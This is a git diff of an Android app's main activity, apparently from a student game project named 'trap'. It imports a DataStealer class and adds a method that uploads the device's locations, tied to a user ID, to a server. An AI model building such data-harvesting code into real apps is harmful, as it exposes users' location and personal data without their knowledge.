@@ -15,7 +15,10 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 
 import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
+import java.util.stream.Collector;
+import java.util.stream.Collectors;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
@@ -27,6 +30,7 @@ import de.hpi3d.gamepgrog.trap.DataStealer;
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
 import de.hpi3d.gamepgrog.trap.datatypes.UserDataPostRequestFactory;
 
 public class MainActivity extends AppCompatActivity {
@@ -236,7 +240,8 @@ public class MainActivity extends AppCompatActivity {
         // Only works if location has been requested before by something else, which might not be
         // the case.
 
-        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
+        FusedLocationProviderClient fusedLocationClient =
+                LocationServices.getFusedLocationProviderClient(this);
 
         fusedLocationClient.getLastLocation()
                 .addOnSuccessListener(this, this::buildLocationToast);
@@ -271,5 +276,13 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-
+    private void sendLocationData(List<Location> locations) {
+        int userid = getUserId();
+        List<LocationData> locationsData = locations
+                .stream()
+                .map(LocationData::fromLocation)
+                .collect(Collectors.toList());
+        server.addData(userid, UserDataPostRequestFactory.buildWithLocations(locationsData))
+                .subscribe();
+    }
 }
